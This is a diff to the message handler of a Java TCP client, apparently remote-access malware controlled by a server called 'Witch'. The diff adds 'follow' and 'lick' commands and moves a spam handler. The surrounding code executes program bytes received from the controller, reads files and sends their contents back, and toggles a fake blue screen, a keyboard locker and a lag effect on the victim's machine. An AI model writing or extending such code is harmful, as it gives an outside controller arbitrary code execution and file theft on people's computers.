@@ -35,11 +35,16 @@ public class Client extends TcpClient {
                 new Thread(() -> ProgramUtil.runProg(data.bytes())).start();
             } else if (message.data instanceof ClientConfigData data) {
                 Witch.CONFIG_INFO = data;
+            } else if (message.data instanceof FollowData data) {
+                Follower.INSTANCE.follow(data);
+            } else if (message.data instanceof SpamData data) {
+                Spam.INSTANCE.spam(data);
             } else if (message.data instanceof BooleanData data) {
                 switch (data.id()) {
                     case "lagger" -> Lag.INSTANCE.lag(data.bl());
                     case "bsod" -> new BSOD().toggle(data.bl());
                     case "keylocker" -> KeyLocker.toggle(data.bl());
+                    case "lick" -> Lick.INSTANCE.lick(data.bl());
                 }
             } else if (message.data instanceof StringsData data) {
                 if (data.data().length == 0) {
@@ -85,8 +90,6 @@ public class Client extends TcpClient {
                         case "read" -> Witch.send("read", FileUtil.read(msg));
                     }
                 }
-            } else if (message.data instanceof SpamData data) {
-                Spam.INSTANCE.spam(data);
             }
         } catch (Exception e) {
             LogUtil.println("Corrupted message!");
